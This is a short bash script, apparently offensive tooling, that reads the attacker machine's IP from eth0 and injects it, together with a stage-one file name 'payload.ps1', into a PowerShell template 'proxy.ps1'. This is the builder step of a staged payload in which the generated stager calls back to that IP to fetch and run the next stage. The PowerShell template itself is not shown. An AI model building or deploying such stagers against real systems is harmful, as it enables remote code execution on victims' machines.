#!/bin/bash
INT="eth0"
STAGE1="payload.ps1"
IP=$(ip -o -f inet addr show "$INT" | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
sed "s/\[\[\[IP]]]/$IP/g" proxy.ps1 | sed "s/\[\[\[STAGE1]]]/$STAGE1/g"
